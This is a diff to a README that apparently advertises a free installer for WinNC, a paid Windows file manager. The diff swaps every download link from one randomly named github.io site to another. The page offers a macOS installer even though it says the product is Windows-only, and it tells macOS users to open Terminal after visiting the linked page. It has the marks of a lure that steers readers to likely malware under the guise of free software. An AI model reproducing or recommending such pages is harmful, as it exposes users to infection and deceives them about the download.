@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-File+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 WinNC Free Installer** — WinNC is a dual-pane file manager for Windows that mimics the classic Norton Commander interface popular among DOS-era users. Works without internet access, no account required. Full offline installation.
+**💻 WinNC Free Installer** — WinNC is a dual-pane file manager for Windows designed to feel familiar to users of Norton Commander and its successors. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install WinNC](https://img.shields.io/badge/⬇_Install_WinNC-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install WinNC](https://img.shields.io/badge/⬇_Install_WinNC-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About WinNC
 
-WinNC is a dual-pane file manager for Windows that mimics the classic Norton Commander interface popular among DOS-era users. With keyboard-driven navigation, built-in archive support, FTP connectivity, and tab management, WinNC brings the commander-style workflow to modern Windows. Its keyboard-centric design maximizes efficiency for users who prefer hands-on-keyboard file management.
+WinNC is a dual-pane file manager for Windows designed to feel familiar to users of Norton Commander and its successors. It provides tabbed panels, FTP support, archive management, and a built-in viewer in a modern Windows interface.
 
 ---
 
 ## ❌ Problem: WinNC is hard to access
 
-- **Windows Only** — No cross-platform support
-- **Commercial License** — Paid license required
-- **Learning Curve** — Commander-style interface requires learning function key commands
-- **Modern UI** — Interface design less contemporary than Windows 11 expectations
+- **Windows Only** — Not available on macOS or Linux
+- **Paid License** — Requires purchase
+- **Niche Market** — Commander-style managers appeal to a specific audience
+- **Competition** — Total Commander has a much larger community and plugin ecosystem
 
 ---
 
@@ -61,9 +61,9 @@ WinNC is a dual-pane file manager for Windows that mimics the classic Norton Com
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ WinNC is a dual-pane file manager for Windows that mimics the classic Norton Com
 
 <div align="center">
 
-[![⬇ Install WinNC](https://img.shields.io/badge/⬇_Install_WinNC-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install WinNC](https://img.shields.io/badge/⬇_Install_WinNC-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ WinNC is a dual-pane file manager for Windows that mimics the classic Norton Com
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ WinNC is a dual-pane file manager for Windows that mimics the classic Norton Com
 
 ---
 
-**WinNC Free Installer** — WinNC is a dual-pane file manager for Windows that mimics the classic Norton Commander interface popular among DOS-era users. Install without internet connection today!
+**WinNC Free Installer** — WinNC is a dual-pane file manager for Windows designed to feel familiar to users of Norton Commander and its successors. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install WinNC](https://img.shields.io/badge/⬇_Install_WinNC-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install WinNC](https://img.shields.io/badge/⬇_Install_WinNC-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
